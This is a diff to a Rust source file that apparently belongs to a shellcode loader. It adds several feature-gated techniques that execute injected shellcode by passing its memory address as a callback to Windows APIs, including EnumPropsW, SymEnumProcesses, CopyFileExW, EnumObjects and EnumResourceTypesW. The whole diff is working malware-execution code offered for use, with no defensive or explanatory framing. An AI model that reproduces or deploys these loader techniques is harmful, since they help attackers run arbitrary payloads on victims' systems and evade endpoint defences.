@@ -3,6 +3,9 @@ use rust_syscalls::syscall;
 use std::ptr::{null_mut, null};
 use std::mem::transmute;
 
+#[cfg(any(feature = "ShellcodeExecuteCopyFileExW", feature = "ShellcodeExecuteEnumResourceTypesW"))]
+use windows_sys::w;
+
 // =======================================================================================================
 // INJECTION WRAPPER
 // =======================================================================================================
@@ -715,7 +718,208 @@ pub fn shellcode_execute_immenuminputcontext(payload: Vec<u8>) -> bool {
     }
 }
 
+// =======================================================================================================
+// EXECUTION METHOD: EnumPropsW
+// =======================================================================================================
+
+#[cfg(feature = "ShellcodeExecuteEnumPropsW")]
+use windows_sys::Win32::{
+    Foundation::GetLastError,
+    UI::WindowsAndMessaging::{EnumPropsW, GetForegroundWindow},
+};
+
+#[cfg(feature = "ShellcodeExecuteEnumPropsW")]
+fn exec_payload_via_callback_func_enumpropsw(start_address: *mut c_void) -> Result<(), String> {
+    let success = unsafe { EnumPropsW(GetForegroundWindow(), transmute(start_address)) };
+    Ok(())
+}
+
+#[cfg(feature = "ShellcodeExecuteEnumPropsW")]
+pub fn shellcode_execute_enumpropsw(payload: Vec<u8>) -> bool {
+    match inject_shellcode(&payload) {
+        Ok(start_address) => {
+            match exec_payload_via_callback_func_enumpropsw(start_address) {
+                Ok(_) => true,
+                Err(_) => false,
+            }
+        }
+        Err(_) => false,
+    }
+}
 
 // =======================================================================================================
-// EXECUTION METHOD: EnumPropsW        
+// EXECUTION METHOD: EnumLanguageGroupLocalesW
 // =======================================================================================================
+
+#[cfg(feature = "ShellcodeExecuteEnumLanguageGroupLocalesW")]
+use windows_sys::Win32::Globalization::{EnumLanguageGroupLocalesW, LGRPID_WESTERN_EUROPE};
+
+#[cfg(feature = "ShellcodeExecuteEnumLanguageGroupLocalesW")]
+fn exec_payload_via_callback_func_enumlanguagegrouplocalesw(
+    start_address: *mut c_void,
+    parameter: Option<isize>,
+) -> Result<(), String> {
+
+    let success = unsafe {
+        EnumLanguageGroupLocalesW(
+            transmute(start_address),
+            LGRPID_WESTERN_EUROPE,
+            0,
+            parameter.unwrap_or(0)
+        )
+    };
+    Ok(())
+}
+
+#[cfg(feature = "ShellcodeExecuteEnumLanguageGroupLocalesW")]
+pub fn shellcode_execute_enumlanguagegrouplocalesw(payload: Vec<u8>) -> bool {
+    match inject_shellcode(&payload) {
+        Ok(start_address) => {
+            match exec_payload_via_callback_func_enumlanguagegrouplocalesw(start_address, None) {
+                Ok(_) => true,
+                Err(_) => false,
+            }
+        }
+        Err(_) => false,
+    }
+}
+
+// =======================================================================================================
+// EXECUTION METHOD: SymEnumProcesses
+// =======================================================================================================
+
+#[cfg(feature = "ShellcodeExecuteSymEnumProcesses")]
+use windows_sys::Win32::System::{
+    Diagnostics::Debug::{SymEnumProcesses, SymInitialize},
+    Threading::GetCurrentProcess,
+};
+
+#[cfg(feature = "ShellcodeExecuteSymEnumProcesses")]
+fn exec_payload_via_callback_func_symenumprocesses(start_address: *mut c_void) -> Result<(), String> {
+    let mut success = unsafe { SymInitialize(GetCurrentProcess(), null_mut(), 0) };
+    success = unsafe { SymEnumProcesses(transmute(start_address), null_mut()) };
+    Ok(())
+}
+
+#[cfg(feature = "ShellcodeExecuteSymEnumProcesses")]
+pub fn shellcode_execute_symenumprocesses(payload: Vec<u8>) -> bool {
+    match inject_shellcode(&payload) {
+        Ok(start_address) => {
+            match exec_payload_via_callback_func_symenumprocesses(start_address) {
+                Ok(_) => true,
+                Err(_) => false,
+            }
+        }
+        Err(_) => false,
+    }
+}
+
+// =======================================================================================================
+// EXECUTION METHOD: CopyFileExW
+// =======================================================================================================
+
+#[cfg(feature = "ShellcodeExecuteCopyFileExW")]
+use windows_sys::Win32::Storage::FileSystem::{CopyFileExW, DeleteFileW};
+
+#[cfg(feature = "ShellcodeExecuteCopyFileExW")]
+fn exec_payload_via_callback_func_copyfileexw(start_address: *mut c_void) -> Result<(), String> {
+
+    unsafe { DeleteFileW(w!(r"C:\Windows\Temp\creator.log")) };
+    let success = unsafe {
+        CopyFileExW(
+            w!(r"C:\Windows\WindowsUpdate.log"),
+            w!(r"C:\Windows\Temp\creator.log"),
+            transmute(start_address),
+            null_mut(),
+            null_mut(),
+            0x00000001, // COPY_FILE_FAIL_IF_EXISTS
+        )
+    };
+    Ok(())
+}
+
+#[cfg(feature = "ShellcodeExecuteCopyFileExW")]
+pub fn shellcode_execute_copyfileexw(payload: Vec<u8>) -> bool {
+    match inject_shellcode(&payload) {
+        Ok(start_address) => {
+            match exec_payload_via_callback_func_copyfileexw(start_address) {
+                Ok(_) => true,
+                Err(_) => false,
+            }
+        }
+        Err(_) => false,
+    }
+}
+
+// =======================================================================================================
+// EXECUTION METHOD: EnumObjects
+// =======================================================================================================
+
+#[cfg(feature = "ShellcodeExecuteEnumObjects")]
+use windows_sys::Win32::Graphics::Gdi::{EnumObjects, GetDC, OBJ_BRUSH};
+
+#[cfg(feature = "ShellcodeExecuteEnumObjects")]
+fn exec_payload_via_callback_func_enumobjects(
+    start_address: *mut c_void,
+    parameter: Option<isize>,
+) -> Result<(), String> {
+
+    let success = unsafe {
+        EnumObjects(
+            GetDC(null_mut()),
+            OBJ_BRUSH,
+            transmute(start_address),
+            parameter.unwrap_or(0),
+        )
+    };
+    Ok(())
+}
+
+#[cfg(feature = "ShellcodeExecuteEnumObjects")]
+pub fn shellcode_execute_enumobjects(payload: Vec<u8>) -> bool {
+    match inject_shellcode(&payload) {
+        Ok(start_address) => {
+            match exec_payload_via_callback_func_enumobjects(start_address, None) {
+                Ok(_) => true,
+                Err(_) => false,
+            }
+        }
+        Err(_) => false,
+    }
+}
+
+// =======================================================================================================
+// EXECUTION METHOD: EnumResourceTypesW
+// =======================================================================================================
+
+#[cfg(feature = "ShellcodeExecuteEnumResourceTypesW")]
+use windows_sys::Win32::System::LibraryLoader::{EnumResourceTypesW, GetModuleHandleW};
+
+#[cfg(feature = "ShellcodeExecuteEnumResourceTypesW")]
+fn exec_payload_via_callback_func_enumresourcetypesw(
+    start_address: *mut c_void,
+    parameter: Option<isize>,
+) -> Result<(), String> {
+
+    let success = unsafe {
+        EnumResourceTypesW(
+            GetModuleHandleW(w!("ntdll.dll")),
+            transmute(start_address),
+            parameter.unwrap_or(0),
+        )
+    };
+    Ok(())
+}
+
+#[cfg(feature = "ShellcodeExecuteEnumResourceTypesW")]
+pub fn shellcode_execute_enumresourcetypesw(payload: Vec<u8>) -> bool {
+    match inject_shellcode(&payload) {
+        Ok(start_address) => {
+            match exec_payload_via_callback_func_enumresourcetypesw(start_address, None) {
+                Ok(_) => true,
+                Err(_) => false,
+            }
+        }
+        Err(_) => false,
+    }
+}
